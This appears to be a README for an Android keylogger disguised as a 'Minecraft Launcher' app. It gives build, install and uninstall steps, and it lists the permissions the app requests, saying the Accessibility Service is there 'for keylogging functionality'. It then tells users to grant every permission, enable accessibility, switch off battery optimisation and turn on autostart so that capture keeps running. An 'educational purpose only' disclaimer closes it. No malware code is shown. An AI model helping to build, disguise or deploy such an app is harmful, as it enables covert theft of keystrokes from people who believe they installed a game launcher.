# Minecraft Launcher - Android Release

## Contents

- `Minecraft_Launcher.apk` - Android application package
- `install_android.sh` - ADB installer script
- `uninstall_android.sh` - ADB uninstaller script
- `README_ANDROID.md` - This file

## Building the APK

### Prerequisites (Linux Only)

1. **Install Buildozer:**
   ```bash
   pip install buildozer
   ```

2. **Install Android Build Dependencies:**
   ```bash
   # Ubuntu/Debian
   sudo apt-get update
   sudo apt-get install -y git zip unzip openjdk-17-jdk wget
   sudo apt-get install -y python3-pip autoconf libtool pkg-config
   sudo apt-get install -y zlib1g-dev libncurses5-dev libncursesw5-dev
   sudo apt-get install -y libtinfo5 cmake libffi-dev libssl-dev
   ```

3. **Build the APK:**
   ```bash
   cd /path/to/minecraft_project
   chmod +x release_android/build_android.sh
   ./release_android/build_android.sh
   ```

   **Note:** First build takes 15-30 minutes as it downloads Android SDK/NDK.

## Installation Methods

### Method 1: Using ADB (Recommended for Developers)

1. **Enable USB Debugging on Android:**
   - Go to Settings > About Phone
   - Tap "Build Number" 7 times to enable Developer Options
   - Go to Settings > Developer Options
   - Enable "USB Debugging"

2. **Connect Device and Install:**
   ```bash
   chmod +x install_android.sh
   ./install_android.sh
   ```

### Method 2: Manual Installation (Easiest for End Users)

1. **Transfer APK to Phone:**
   - Email the APK to yourself
   - Upload to Google Drive/Dropbox and download on phone
   - Transfer via USB cable

2. **Install on Phone:**
   - Open the APK file on your phone
   - Tap "Install"
   - If prompted, enable "Install from Unknown Sources"
   - Grant all requested permissions

## Permissions Required

The app requests these permissions:
- **Internet** - For network communication
- **Storage** - To save logs and data
- **Camera** - For face authentication
- **Accessibility Service** - For keylogging functionality
- **Boot Completed** - To start on device boot
- **System Alert Window** - For overlay features

## Uninstallation

### Using ADB:
```bash
chmod +x uninstall_android.sh
./uninstall_android.sh
```

### Manual Uninstall:
1. Go to Settings > Apps
2. Find "Minecraft Launcher"
3. Tap "Uninstall"

## Important Notes

### Android Security Restrictions

⚠️ **Android 10+ Restrictions:**
- Android 10 and newer have strict background restrictions
- Accessibility services may be disabled by the system
- Some features may require the app to be in foreground
- Battery optimization may kill background services

### Granting Accessibility Permission

For keylogging to work, you MUST grant Accessibility permission:

1. Open Settings > Accessibility
2. Find "Minecraft Launcher"
3. Enable the accessibility service
4. Confirm the warning dialog

### Keeping App Running

To prevent Android from killing the app:

1. **Disable Battery Optimization:**
   - Settings > Apps > Minecraft Launcher
   - Battery > Battery Optimization
   - Select "Don't optimize"

2. **Lock App in Recent Apps:**
   - Open Recent Apps
   - Find Minecraft Launcher
   - Tap the lock icon

3. **Enable Autostart (varies by manufacturer):**
   - **Xiaomi:** Security > Permissions > Autostart
   - **Huawei:** Phone Manager > Protected Apps
   - **Samsung:** Settings > Apps > Auto-start
   - **OnePlus:** Settings > Battery > Battery Optimization

## Troubleshooting

### APK Won't Install
- Enable "Install from Unknown Sources" in Settings
- Check if you have enough storage space
- Uninstall any previous version first

### Permissions Not Working
- Go to Settings > Apps > Minecraft Launcher > Permissions
- Manually grant all permissions
- Enable Accessibility service

### App Stops Working
- Check if battery optimization is disabled
- Verify accessibility service is still enabled
- Restart the device

### Build Errors
- Ensure you're building on Linux (not Windows)
- Check all dependencies are installed
- Try: `buildozer android clean` then rebuild

## Compatibility

- **Minimum Android Version:** Android 5.0 (API 21)
- **Target Android Version:** Android 13 (API 33)
- **Architectures:** ARM64, ARMv7
- **Tested Devices:** Most modern Android phones

## Security Warning

⚠️ **Educational Purpose Only**

This application is for educational and research purposes only. Unauthorized monitoring of devices may be illegal in your jurisdiction. Always obtain proper consent before deploying monitoring software.

## Technical Details

- **Framework:** Kivy (Python for Android)
- **Build Tool:** Buildozer
- **Package Name:** com.minecraft.minecraftlauncher
- **Version:** 1.0
- **Size:** ~20-30 MB (varies by architecture)

## Support

For issues specific to Android:
- Check logcat: `adb logcat | grep python`
- View app logs: `adb logcat | grep minecraftlauncher`
- Debug mode: Enable in Developer Options
